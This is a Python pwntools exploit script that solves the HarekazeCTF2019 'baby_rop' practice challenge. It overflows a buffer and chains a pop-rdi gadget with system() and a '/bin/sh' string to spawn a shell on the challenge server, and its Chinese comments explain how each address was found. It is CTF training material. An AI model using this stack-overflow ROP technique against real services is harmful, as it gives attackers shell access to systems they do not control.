'''
@Author       : 白银
@Date         : 2023-04-03 16:50:21
@LastEditors  : 白银
@LastEditTime : 2023-04-04 15:19:23
@FilePath     : /pwn/[HarekazeCTF2019]baby_rop.py
@Description  : ret2libc  https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop
@Attention    : 
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''

from pwn import *
# from libcfind import *

set_arch = 0  # set_arch中，int，0→amd64，1→arm64，2→i386
pwnfile = './[HarekazeCTF2019]baby_rop'  # pwnfile， str，二进制文件
if_remote = 1  # if_remote，int，1→远程，别的数字→本地
# 打本地，if_remote改别的数字就可以，最后两个参数随便改

# set_arch = 0
if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

print(context)
# context(log_level='debug', arch='i386', os='linux')
# pwnfile = './pwn1'
elf = ELF(pwnfile)

if if_remote == 1:
    # io = remote("192.168.61.139", 8888)
    # io = remote(remote_addr, remote_port)
    io = remote("node4.buuoj.cn", 26331)
    # libc = ELF('/home/jack/Desktop/libc.so.6')
    if set_arch == 0 or set_arch == 1:
        # libc = elf.libc
        libc = ELF('/home/jack/Desktop/libc-2.23.so')
        # libc = ELF('/home/jack/Desktop/2.23x64libc.so.6')
    else:
        # libc = elf.libc
        libc = ELF('/home/jack/Desktop/libc-2.23.so')
        # libc = ELF('/home/jack/Desktop/2.23x86libc.so.6')
else:
    io = process(pwnfile)
    # 本地用
    # elf = ELF(pwnfile)
    # libc = elf.libc
    libc = ELF('/home/jack/Desktop/libc-2.23.so')
    rop = ROP(pwnfile)
    # 本地调试用
    gdb.attach(io)
    pause()

padding = 0x18  # ida看，上限和r差多少
# ROPgadget --binary [HarekazeCTF2019]baby_rop --only "pop|ret"
pop_rdi_ret = 0x400683 # 0x0000000000400683 : pop rdi ; ret
call_sys = 0x400490 # ida找到system函数，进去之后通过; CODE XREF: _system↑j进system的plt，直接左边地址，不要jmp：.plt:0000000000400490 FF 25 82 0B 20 00             jmp     cs:off_601018
bin_sh_addr = 0x601048  # ida用shift+f12找到sh

payload = flat(['a' * padding, pop_rdi_ret, bin_sh_addr, call_sys])
delimiter = 'What\'s your name? '

if if_remote == 1:
    io.sendline(payload)  # 远程用
    
else:
    io.sendlineafter(delimiter, payload)  # 本地用

io.interactive()
